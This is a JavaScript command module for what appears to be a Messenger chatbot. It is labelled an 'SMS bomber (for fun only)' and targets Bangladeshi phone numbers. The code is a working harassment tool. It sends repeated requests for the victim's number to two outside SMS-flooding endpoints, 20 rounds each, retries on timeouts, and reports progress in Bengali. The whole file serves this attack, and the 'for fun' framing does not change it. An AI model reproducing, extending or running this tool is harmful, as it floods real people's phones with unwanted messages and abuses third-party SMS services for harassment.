
const axios = require("axios");

const bombingFlags = {};
const apis = [
  num => `https://bj-x-coder.top/bo_m_ber.php?phone=${num}`,
  num => `https://bhauxsms-tll6.onrender.com/sms?num=${num}`
];

module.exports = {
  config: {
    name: "sms",
    version: "2.1.0",
    author: "SiamBhau",
    countDown: 0,
    role: 0,
    description: {
      en: "SMS bomber (for fun only)"
    },
    category: "tool",
    guide: {
      en: "{pn} 01xxxxxxxxx (Bangladeshi number)"
    }
  },

  onStart: async function({ api, event, args, message }) {
    const threadID = event.threadID;
    const number = args[0];
    const userID = event.senderID;

    if (!/^01[0-9]{9}$/.test(number)) {
      return message.reply(
        "SMS BOMBER - by Siam Bhau\nব্যবহার: /sms 01xxxxxxxxx (বাংলাদেশি নাম্বার দিন)\nএটি শুধুমাত্র মজার জন্য ব্যবহার করুন।"
      );
    }

    if (!bombingFlags[threadID]) {
      bombingFlags[threadID] = {};
    }

    if (!bombingFlags[threadID][userID]) {
      bombingFlags[threadID][userID] = [];
    }

    if (bombingFlags[threadID][userID].includes(number)) {
      return message.reply("❗এই নাম্বারে ইতিমধ্যে বোম্বিং চলছে!");
    }

    bombingFlags[threadID][userID].push(number);
    message.reply(`✅ SMS বোম্বিং শুরু হয়েছে ${number} নম্বরে...`);

    const makeRequest = async (url) => {
      try {
        await axios.get(url, { timeout: 5000 });
      } catch (err) {
        if (err.code === 'ECONNABORTED' || err.message.includes('socket hang up')) {
          await makeRequest(url);
        } else {
          throw err;
        }
      }
    };

    (async function startBombing() {
      try {
        for (let i = 0; i < 20; i++) {
          for (let apiFunc of apis) {
            await makeRequest(apiFunc(number));
          }
        }
      } catch (err) {
        message.reply(`❌ ত্রুটি: ${err.message}`);
      } finally {
        bombingFlags[threadID][userID] = bombingFlags[threadID][userID].filter(n => n !== number);
      }
    })();
  }
};